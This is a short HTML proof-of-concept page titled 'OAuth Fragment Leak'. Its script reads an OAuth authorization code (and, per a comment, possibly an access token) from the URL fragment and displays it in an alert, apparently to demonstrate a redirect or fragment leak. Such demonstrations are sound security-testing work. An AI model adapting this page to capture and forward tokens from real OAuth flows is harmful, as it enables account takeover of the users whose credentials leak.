<!DOCTYPE html>
<html>
<head>
  <title>OAuth Fragment Leak</title>
</head>
<body>
  <script>
    // Extract URL fragment (everything after #)
    const fragment = window.location.hash.substring(1); // removes the '#' character
    const params = new URLSearchParams(fragment);

    // Extract the code (you can also extract access_token if present)
    const code = params.get("code");
    alert('we got the code: ' + code );
  </script>
</body>
</html>
